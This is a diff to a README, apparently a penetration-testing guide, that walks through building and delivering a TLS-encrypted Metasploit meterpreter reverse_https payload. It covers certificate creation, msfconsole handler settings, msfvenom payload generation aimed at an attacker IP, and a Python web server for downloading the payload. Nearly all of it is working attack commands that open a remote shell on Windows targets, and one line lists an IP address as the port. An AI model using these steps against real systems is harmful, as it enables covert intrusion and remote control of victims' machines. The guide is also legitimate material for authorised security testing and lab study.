@@ -14,6 +14,7 @@ Use this for ethical hacking only
     
     
 3- Create custom SSL/TLS certificate 
+    https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html
 
     openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
     -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
@@ -23,17 +24,27 @@ Use this for ethical hacking only
     rm -f www.example.com.key  www.example.com.crt
     
       
+4- Config the msfconsole
+
+    msfconsole
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_https
+    set HandlerSSLCert www.example.com.pem
+    set StagerVerifySSLCert true
+    set HandlerSSLCert /home/kali/cybersecurity/www.example.com.pem
+    exit
+   
     
 4- Create the Payload with msfvenom in Kali linux
-    in my case:
-    Host IP= 192.168.235.132
-    Host Port= 192.168.235.132
-    Path To cert file= /home/kali/cybersecurity/www.example.com.pem
+
+   In my case:
+   - Host IP= 192.168.235.132  
+   - Host Port= 192.168.235.132
+   - Path To cert file= /home/kali/cybersecurity/www.example.com.pem
       
     msfvenom -p windows/x64/meterpreter/reverse_https lhost=(Host IP) lport=(Host Port) HandlerSSLCert=(Path To cert file) StagerVerifySSLCert=true -f raw > load.bin
     
    
-    
 5- Setup the http webserver for Payload download (while in cybersecurity folder)
 
     python -m http.server
